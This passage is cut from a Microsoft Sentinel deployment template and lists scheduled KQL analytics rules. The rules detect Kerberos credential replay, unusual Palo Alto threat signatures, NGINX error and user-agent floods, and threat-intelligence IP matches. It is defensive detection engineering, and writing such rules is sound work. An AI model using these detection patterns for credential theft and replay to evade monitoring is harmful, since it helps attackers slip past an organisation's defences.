          "description": "This detection identifies potential Kerberos replay attacks (Event ID 4649) that occur shortly after explicit credential use (Event ID 4648) on the same host by the same account. \nIt focuses on real user accounts (non-machine accounts) reusing credentials to authenticate to machine accounts, which may indicate lateral movement or credential replay activity.\nThis rule helps surface suspicious Kerberos ticket reuse scenarios that may indicate compromised accounts or automated lateral movement tools.\n\nExpected Conditions:\n- ReplayHost == LogonHost\n- ReplayUser == LogonUser\n- ReplayTargetUser is a machine account (ends with $)\n- Time between 4648 and 4649 events is \u00e2\u2030\u00a4 5 minutes",
          "severity": "Medium",
          "enabled": false,
          "query": "let replayEvents = \n    SecurityEvent\n    | where EventID == 4649\n    | extend ReplayTime = TimeGenerated\n    | project ReplayTime, ReplayHost = Computer, ReplayUser = Account, ReplayTargetUser = TargetUserName;\nlet logonEvents = \n    SecurityEvent\n    | where EventID == 4648\n    | extend LogonTime = TimeGenerated\n    | project LogonTime, LogonHost = Computer, LogonUser = Account, TargetServerName, TargetUserName;\nreplayEvents\n| join kind=inner (\n    logonEvents\n) on $left.ReplayUser == $right.LogonUser and $left.ReplayHost == $right.LogonHost\n| extend TimeDelta = datetime_diff(\"minute\", LogonTime, ReplayTime)\n| where TimeDelta >= 0 and TimeDelta <= 5\n| where ReplayTargetUser endswith \"$\"  // replay *against* a machine\n| where ReplayUser !endswith \"$\"       // initiated *by* a real user account\n| summarize Count = count(), FirstSeen = min(ReplayTime), LastSeen = max(ReplayTime), Hosts = make_set(ReplayHost, 5)\n    by ReplayUser\n| where Count >= 2\n| project ReplayUser, Count, FirstSeen, LastSeen, Hosts\n\n",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 2,
          "suppressionDuration": "PT2H",
          "suppressionEnabled": true,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation",
            "CredentialAccess",
            "LateralMovement"
          ],
          "techniques": [
            "T1550"
          ],
          "subTechniques": [
            "T1550.003"
          ],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f490fc06-4183-40d4-8d39-85738be03841')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f490fc06-4183-40d4-8d39-85738be03841')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Palo Alto Threat signatures from Unusual IP addresses",
          "description": "NOTICE: This rule was replaced with - [DCSS Custom] Palo Alto Threat signatures from Unusual IP addresses with Threat Intelligence Correlation \n\nIdentifies Palo Alto Threat signatures from unusual IP addresses which are not historically seen. \nThis detection is also leveraged and required for MDE and PAN Fusion scenario\nhttps://docs.microsoft.com/Azure/sentinel/fusion-scenario-reference#network-request-to-tor-anonymization-service-followed-by-anomalous-traffic-flagged-by-palo-alto-networks-firewall",
          "severity": "Medium",
          "enabled": false,
          "query": "let starttime = 7d;\nlet endtime = 1d;\nlet timeframe = 1h;\nlet HistThreshold = 25; \nlet CurrThreshold = 10; \nlet HistoricalThreats = CommonSecurityLog\n| where isnotempty(SourceIP)\n| where TimeGenerated between (startofday(ago(starttime))..startofday(ago(endtime)))\n| where DeviceVendor =~ \"Palo Alto Networks\"\n| where Activity =~ \"THREAT\" and SimplifiedDeviceAction =~ \"alert\" \n| where DeviceEventClassID in ('spyware', 'scan', 'file', 'vulnerability', 'flood', 'packet', 'virus','wildfire', 'wildfire-virus')\n| summarize TotalEvents = count(), ThreatTypes = make_set(DeviceEventClassID), DestinationIpList = make_set(DestinationIP), FirstSeen = min(TimeGenerated) , LastSeen = max(TimeGenerated) by SourceIP, DeviceAction, DeviceVendor;\nlet CurrentHourThreats =  CommonSecurityLog\n| where isnotempty(SourceIP)\n| where TimeGenerated > ago(timeframe)\n| where DeviceVendor =~ \"Palo Alto Networks\"\n| where Activity =~ \"THREAT\" and SimplifiedDeviceAction =~ \"alert\" \n| where DeviceEventClassID in ('spyware', 'scan', 'file', 'vulnerability', 'flood', 'packet', 'virus','wildfire', 'wildfire-virus')\n| summarize TotalEvents = count(), ThreatTypes = make_set(DeviceEventClassID), DestinationIpList = make_set(DestinationIP), FirstSeen = min(TimeGenerated) , LastSeen = max(TimeGenerated) by SourceIP, DeviceAction, DeviceProduct, DeviceVendor;\nCurrentHourThreats \n| where TotalEvents < CurrThreshold\n| join kind = leftanti (HistoricalThreats \n| where TotalEvents > HistThreshold) on SourceIP\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery",
            "Exfiltration",
            "CommandAndControl"
          ],
          "techniques": [
            "T1046",
            "T1030",
            "T1071"
          ],
          "subTechniques": [
            "T1071.001"
          ],
          "alertRuleTemplateName": "89a86f70-615f-4a79-9621-6f68c50f365f",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDynamicProperties": []
          },
          "customDetails": {},
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2cabbb8f-d46e-49d6-bec0-fe86e798fe29')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2cabbb8f-d46e-49d6-bec0-fe86e798fe29')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] NGINX - Multiple client errors from single IP address - Excluding MDEDiscovery",
          "description": "This KQL query detects when a source IP generates over 100 client error responses (HTTP 400\u00e2\u20ac\u201c499) within a 5\u00e2\u20ac\u2018minute interval in NGINX logs. \n\nIt excludes entries where the UrlOriginal contains \"MDEDiscovery\"\u00e2\u20ac\u201dwhich is a benign probes from Defender vulnerability scans.",
          "severity": "Medium",
          "enabled": true,
          "query": "let threshold = 100;\nNGINXHTTPServer\n| where not(ipv4_is_in_range(SrcIpAddr, \"169.2.0.0/15\"))   // Check if source IP is not in CDT IP's range --  Param\n| where tolong(HttpStatusCode) >= 400 and tolong(HttpStatusCode) <= 499 \n| where UrlOriginal !contains \"MDEDiscovery\"\n| summarize MultipleClientErrors = count(), Urls = make_list(UrlOriginal) by SrcIpAddr, bin(TimeGenerated, 5m)\n| where MultipleClientErrors > threshold\n//| where SrcIpAddr !in (\"169.2.108.102\")  //CDT \n| extend IPCustomEntity = SrcIpAddr,\n         Name = \"High 4xx Client Errors\",\n         Description = strcat(\"Detected \", tostring(MultipleClientErrors), \" client errors from \", SrcIpAddr, \" in a 5-minute window. URLs: \", tostring(Urls))\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/e3f2abf7-2f43-4f71-886c-36aad5ad5a29')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/e3f2abf7-2f43-4f71-886c-36aad5ad5a29')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] NGINX - Multiple user agents for single source - Suspicious Unapproved IP",
          "description": "This alert identifies source IP addresses that are not on the approved list and that exhibit more than 5 unique HTTP user agents within a 5-minute window. Such behavior may indicate automated activity or potential malicious attempts to evade detection. The alert helps security teams quickly pinpoint and investigate unusual traffic patterns that deviate from typical user behavior.",
          "severity": "Medium",
          "enabled": true,
          "query": "let threshold = 5; \n// Approved IP addresses\n//let approvedIPs = dynamic([\"169.2.108.102\" // CDT]);\n \nNGINXHTTPServer\n//| where not(SrcIpAddr in (approvedIPs))\n| where not(ipv4_is_in_range(SrcIpAddr, \"169.2.0.0/15\")) //Checking the SourceIP is not part of the range of CDT IP's \n| summarize makeset(HttpUserAgentOriginal) by SrcIpAddr, bin(TimeGenerated, 5m)\n| extend ua_count = array_length(set_HttpUserAgentOriginal)\n| where ua_count > threshold\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "SrcIpAddr": "SrcIpAddr"
          },
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9500')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9500')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9500: [Health] Sentinel - Incident Health",
          "description": "This rule runs once per day to generate an incident used to indicate a healthy Sentinel environment. MITRE:  Category: Health tag: Health",
          "severity": "Informational",
          "enabled": true,
          "query": "let start_time = 1d;\nlet end_time = now();\nunion isfuzzy=true \n(Usage\n|project TimeGenerated\n | where TimeGenerated > ago(start_time) and TimeGenerated < end_time\n |take 1)\n ,\n (SentinelAudit\n |project TimeGenerated\n | where TimeGenerated > ago(start_time) and TimeGenerated < end_time\n |take 1)\n   ,\n (SentinelHealth\n |project TimeGenerated\n | where TimeGenerated > ago(start_time) and TimeGenerated < end_time\n |take 1)\n ,\n (SecurityAlert\n |project TimeGenerated\n | where TimeGenerated > ago(start_time) and TimeGenerated < end_time\n |take 1)\n|project TimeGenerated\n|take 1\n|extend bv_start_time = now()\n  //, bv_mss_category = 'LogSource Disruption'\n  //, bv_alarm_type = 'Silent Device'\n  //, bv_alarm_sub_type = 'EFD v1.0'\n  , bv_alarm_name = 'BV-9500'\n  , bv_alarm_severity = 'informational'\n  , sourcetype = 'Health'\n  //, bv_alarm_threshold = strcat('System missing for more than ', Threshold, ' days')\n  //, bv_alarm_value = strcat(EventCount, ' systems missing')\n  , bv_severity = 'informational'\n  //, bv_reporting_dvc = strcat_array(array_slice(Src,0,20), '\\n* ')\n|extend current_hour = datetime_part('hour', bv_start_time)\n|where current_hour == 13 \n| extend bv_rule_version = '1.0.4893'\n| extend bv_rule_timestamp = '1708455178.7731283'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4893 bv_rule_timestamp: 1708455178.7731283'\n| project-keep \n     sourcetype\n    , bv_*",
          "queryFrequency": "PT50M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9500: [Health] Sentinel - Incident Health",
            "alertDescriptionFormat": "This rule generates an incident once per day and is used to indicate a healthy Sentinel environment.\n\nCategory: Health\ntag: Health\n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2950f352-f92d-4722-8fe4-aba1eb494be7')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2950f352-f92d-4722-8fe4-aba1eb494be7')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] TI Map IP Entity to CommonSecurityLog WITH Threat Intelligence and ASA Filter",
          "description": "This query correlates external threat intelligence indicators with connection events captured in CommonSecurityLog. Then checks the ASA severity from log event messages using a regular expression, the query filters results to only include events with severity levels 0\u00e2\u20ac\u201c4.\n\nCisco ASA uses syslog message severity levels to indicate the severity of the condition described by the syslog message. The lower the number, the more severe the condition. The severity levels are as follows:\n\n0: Emergencies - System is unusable.\n1: Alert - Immediate action is needed.\n2: Critical - Critical conditions.\n3: Error - Error conditions.\n4: Warning - Warning conditions.\n5: Notification - Normal but significant conditions.\n6: Informational - Informational messages.\n7: Debugging - Debugging messages.",
          "severity": "Medium",
          "enabled": true,
          "query": "// The query_now parameter represents the time (in UTC) at which the scheduled analytics rule ran to produce this alert.\nlet IPRegex = '[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}';\nlet dt_lookBack = 1h; // Look back 1 hour for CommonSecurityLog events\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\n// Fetch threat intelligence indicators related to IP addresses\nlet IP_Indicators = ThreatIntelligenceIndicator\n    | where isnotempty(NetworkIP)\n        or isnotempty(EmailSourceIpAddress)\n        or isnotempty(NetworkDestinationIP)\n        or isnotempty(NetworkSourceIP)\n    | where TimeGenerated >= ago(ioc_lookBack)\n    | extend TI_ipEntity = iff(isnotempty(NetworkIP), NetworkIP, NetworkDestinationIP)\n    | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkSourceIP), NetworkSourceIP, TI_ipEntity)\n    | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(EmailSourceIpAddress), EmailSourceIpAddress, TI_ipEntity)\n    | where ipv4_is_private(TI_ipEntity) == false\n        and TI_ipEntity !startswith \"fe80\"\n        and TI_ipEntity !startswith \"::\"\n        and TI_ipEntity !startswith \"127.\"\n    | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n    | where Active == true and ExpirationDateTime > now();\n// Fetch CommonSecurityLog entries for both Built and Teardown connections\nlet AllConnections = CommonSecurityLog\n    | where (DeviceAction contains \"Built\" or DeviceAction contains \"Teardown\")\n    | where TimeGenerated >= ago(dt_lookBack)\n    | extend MessageIP = extract(IPRegex, 0, Message)\n    | extend CS_ipEntity = iff(isnotempty(SourceIP), SourceIP, DestinationIP)\n    | extend CS_ipEntity = iff(isempty(CS_ipEntity) and isnotempty(MessageIP), MessageIP, CS_ipEntity)\n    | extend CommonSecurityLog_TimeGenerated = TimeGenerated;\n// Join indicators with all connection types and retain both \"Built\" and \"Teardown\"\nlet JoinedResults = IP_Indicators\n    | join kind=innerunique (AllConnections) on $left.TI_ipEntity == $right.CS_ipEntity\n    | where CommonSecurityLog_TimeGenerated < ExpirationDateTime;\n// Separate \"Built\" and \"Teardown\" events explicitly for distinct output\nlet BuiltResults = JoinedResults\n    | where DeviceAction contains \"Built\";\nlet TeardownResults = JoinedResults\n    | where DeviceAction contains \"Teardown\";\n// Combine results, extract ASA severity from the Message field, and filter to only trigger on ASA severity 0-4\nunion BuiltResults, TeardownResults\n| extend ASA_Severity = toint(extract(\"^%ASA-([0-9]+)-\", 1, Message))\n| where ASA_Severity in (0, 1, 2, 3, 4)\n| project\n    timestamp = CommonSecurityLog_TimeGenerated,\n    SourceIP,\n    DestinationIP,\n    MessageIP,\n    Message,\n    DeviceVendor,\n    DeviceProduct,\n    IndicatorId,\n    ThreatType,\n    ExpirationDateTime,\n    ConfidenceScore,\n    TI_ipEntity,\n    CS_ipEntity,\n    LogSeverity,\n    DeviceAction,\n    Type\n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/ac4f3169-4c79-4b23-b595-d029e18e722a')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/ac4f3169-4c79-4b23-b595-d029e18e722a')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] TI map IP entity to Network Session Events (ASIM Network Session schema)",
          "description": "TESTING COMPLETE - replaced existing \"TI map IP entity to Network Session Events (ASIM Network Session schema)\"  rule. The purpose is to detect potentially malicious network activity by correlating recent network sessions and security logs with known threat intelligence indicators. It begins by retrieving active threat intelligence indicators associated with IP addresses within a defined look-back period. These indicators are then cross-referenced against network flagging sessions where the source or destination IP matches any IP identified as a threat. To minimize noise, it excludes connections that are explicitly denied by security policies. Finally, it correlates these suspicious connections with recent security logs, focusing on specific action messages like \"Allow\", \"built,\" and \"teardown,\" which provide further context on network behavior involving these IPs. The output includes details of flagged sessions, such as source and destination IPs, actions taken by devices, and network directions",
          "severity": "Medium",
          "enabled": false,
          "query": "// The `query_now` parameter represents the UTC time at which the scheduled analytics rule ran to produce this alert.\n//\nlet dt_lookBack = 1h;// Adjust this value along with `SrcIPAddr` for additional traffic insights on suspicious IPs.\n// The `ioc_lookBack` parameter defines the time window (14 days) to look back for threat intelligence indicators.\nlet ioc_lookBack = 14d;\n// Create a materialized table `IP_TI` for active Threat Intelligence Indicators (TIs) related to IPs.\n// Filters out indicators with no IP entity and keeps only active ones with a valid expiration date.\nlet IP_TI = materialize (\n    ThreatIntelligenceIndicator\n    | where TimeGenerated >= ago(ioc_lookBack)\n    | extend TI_ipEntity = coalesce(NetworkIP, NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress, \"NO_IP\")\n    | where TI_ipEntity != \"NO_IP\"\n    | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n    | where Active == true and ExpirationDateTime > now()\n);\n// Identify matches between Threat Intelligence IPs and network session data within the `dt_lookBack` window.\nlet IP_Matches = IP_TI\n    | join kind=innerunique \n        (\n        // Query network session data (`_Im_NetworkSession`) to find traffic matching the TI indicators.\n        _Im_NetworkSession (starttime=ago(dt_lookBack))\n        | where isnotempty(SrcIpAddr)\n        | where DvcAction != \"Deny\" // Exclude denied connections to focus on allowed traffic.\n        | summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated)\n            by\n            SrcIpAddr,\n            DstIpAddr,\n            Dvc,\n            DvcAction,\n            EventMessage,\n            EventProduct,\n            DstPortNumber,\n            NetworkDirection,\n            Rule,\n            EventOriginalResultDetails,\n            SrcPortNumber\n        // Match source IP addresses with TI indicators and flag them as matches (`SrcMatch` and `DstMatch`).\n        | lookup (IP_TI\n            | project TI_ipEntity, Active)\n            on $left.SrcIpAddr == $right.TI_ipEntity\n        | project-rename SrcMatch = Active\n        | lookup (IP_TI\n            | project TI_ipEntity, Active)\n            on $left.DstIpAddr == $right.TI_ipEntity\n        | project-rename DstMatch = Active\n        | where SrcMatch or DstMatch \n        | extend IoCDirection = iff(SrcMatch, \"Source\", \"Destination\") \n        )\n        on $left.TI_ipEntity == $right.SrcIpAddr\n    | where imNWS_mintime < ExpirationDateTime; \n// Join network session matches (`IP_Matches`) with Common Security Log data within the `dt_lookBack` window.\nIP_Matches\n| join kind=innerunique (\n    CommonSecurityLog\n    | where TimeGenerated >= ago(dt_lookBack)\n    | extend TI_ipEntity = SourceIP // Use `SourceIP` as the entity for TI matching.\n    | where Message contains \"built\" \n        or Message contains \"teardown\" \n        or Activity contains \"TRAFFIC\" \n    | extend ActionType = case(\n                          Message contains \"built\", \"Built\",\n                          Message contains \"teardown\", \"Teardown\",\n                          \"Unknown\"\n                      )\n    //\n    // Uncomment and replace `SourceIP` with a specific IP for focused analysis.\n    //| where SourceIP == \"Replace with Suspicious Source IP\" \n    //\n    | extend CommonSecurityLog_TimeGenerated = TimeGenerated\n    )\n    on $left.SrcIpAddr == $right.TI_ipEntity\n| where CommonSecurityLog_TimeGenerated < ExpirationDateTime \n| summarize CommonSecurityLog_TimeGenerated = arg_max(CommonSecurityLog_TimeGenerated, *) by IndicatorId, TI_ipEntity, ActionType, DeviceEventClassID, SimplifiedDeviceAction, CommunicationDirection, LogSeverity\n| project\n    imNWS_mintime, \n    imNWS_maxtime, \n    Description, \n    IndicatorId, \n    ThreatType, \n    LogSeverity, \n    ExpirationDateTime, \n    SrcIpAddr, // Source = TI_ipEntity\n    SrcPortNumber,\n    DstIpAddr, \n    DstPortNumber, \n    IoCDirection, // Direction of IOC match (Source/Destination)\n    CommunicationDirection, // Direction of communication (e.g., inbound/outbound)\n    EventOriginalResultDetails, \n    DvcAction, \n    DeviceEventClassID, \n    SimplifiedDeviceAction, \n    TI_ipEntity, // Source = TI_ipEntity\n    EventMessage, \n    EventProduct, \n    NetworkDirection, // Network direction (e.g., inbound/outbound)\n    Rule, // Rule that triggered the event\n    Dvc; \n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "DstIpAddr"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a206a682-2800-4ea4-8534-d21f6735d857')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a206a682-2800-4ea4-8534-d21f6735d857')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom- TEST] TI map IP entity to Network Session Events with ASA Severity Filter (ASIM Network Session schema)",
          "description": "This query works by linking known malicious IP addresses from threat intelligence with internal network session data from Cisco ASA security logs. A regular expression is used to pull the ASA severity level from the event messages, and only those events with a severity between 0 and 4 are kept.\n\nCisco ASA uses syslog message severity levels to indicate the severity of the condition described by the event message. The lower the number, the more severe the condition. The severity levels are as follows:\n\n0: Emergencies - System is unusable.\n1: Alert - Immediate action is needed.\n2: Critical - Critical conditions.\n3: Error - Error conditions.\n4: Warning - Warning conditions.\n5: Notification - Normal but significant conditions.\n6: Informational - Informational messages.\n7: Debugging - Debugging messages.",
          "severity": "Medium",
          "enabled": true,
          "query": "// The `query_now` parameter represents the UTC time at which the scheduled analytics rule ran to produce this alert.\n//\nlet dt_lookBack = 1h;// Adjust this value along with `SrcIPAddr` for additional traffic insights on suspicious IPs.\n// The `ioc_lookBack` parameter defines the time window (14 days) to look back for threat intelligence indicators.\nlet ioc_lookBack = 14d;\n// Create a materialized table `IP_TI` for active Threat Intelligence Indicators (TIs) related to IPs.\n// Filters out indicators with no IP entity and keeps only active ones with a valid expiration date.\nlet IP_TI = materialize (\n    ThreatIntelligenceIndicator\n    | where TimeGenerated >= ago(ioc_lookBack)\n    | extend TI_ipEntity = coalesce(NetworkIP, NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress, \"NO_IP\")\n    | where TI_ipEntity != \"NO_IP\"\n    | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n    | where Active == true and ExpirationDateTime > now()\n    );\n// Identify matches between Threat Intelligence IPs and network session data within the `dt_lookBack` window.\nlet IP_Matches = IP_TI\n    | join kind=innerunique \n        (\n        // Query network session data (`_Im_NetworkSession`) to find traffic matching the TI indicators.\n        _Im_NetworkSession (starttime=ago(dt_lookBack))\n        | where isnotempty(SrcIpAddr)\n        | where DvcAction != \"Deny\" // Exclude denied connections to focus on allowed traffic.\n        | summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated)\n            by\n            SrcIpAddr,\n            DstIpAddr,\n            Dvc,\n            DvcAction,\n            EventMessage,\n            EventProduct,\n            DstPortNumber,\n            NetworkDirection,\n            Rule,\n            EventOriginalResultDetails,\n            SrcPortNumber\n        // Match source IP addresses with TI indicators and flag them as matches (`SrcMatch` and `DstMatch`).\n        | lookup (IP_TI\n            | project TI_ipEntity, Active)\n            on $left.SrcIpAddr == $right.TI_ipEntity\n        | project-rename SrcMatch = Active\n        | lookup (IP_TI\n            | project TI_ipEntity, Active)\n            on $left.DstIpAddr == $right.TI_ipEntity\n        | project-rename DstMatch = Active\n        | where SrcMatch or DstMatch \n        | extend IoCDirection = iff(SrcMatch, \"Source\", \"Destination\") \n        )\n        on $left.TI_ipEntity == $right.SrcIpAddr\n    | where imNWS_mintime < ExpirationDateTime; \n// Join network session matches (`IP_Matches`) with Common Security Log data within the `dt_lookBack` window.\nIP_Matches\n| join kind=innerunique (\n    CommonSecurityLog\n    | where TimeGenerated >= ago(dt_lookBack)\n    | extend TI_ipEntity = SourceIP // Use `SourceIP` as the entity for TI matching.\n    | where Message contains \"built\" \n        or Message contains \"teardown\" \n        or Activity contains \"TRAFFIC\" \n    | extend ActionType = case(\n                          Message contains \"built\",\n                          \"Built\",\n                          Message contains \"teardown\",\n                          \"Teardown\",\n                          \"Unknown\"\n                      )\n    //\n    // Uncomment and replace `SourceIP` with a specific IP for focused analysis.\n    //| where SourceIP == \"Replace with Suspicious Source IP\" \n    //\n    | extend CommonSecurityLog_TimeGenerated = TimeGenerated\n    )\n    on $left.SrcIpAddr == $right.TI_ipEntity\n| where CommonSecurityLog_TimeGenerated < ExpirationDateTime \n| summarize CommonSecurityLog_TimeGenerated = arg_max(CommonSecurityLog_TimeGenerated, *)\n    by\n    IndicatorId,\n    TI_ipEntity,\n    ActionType,\n    DeviceEventClassID,\n    SimplifiedDeviceAction,\n    CommunicationDirection,\n    LogSeverity\n// Extend the query with a new field to extract the ASA severity from the EventMessage 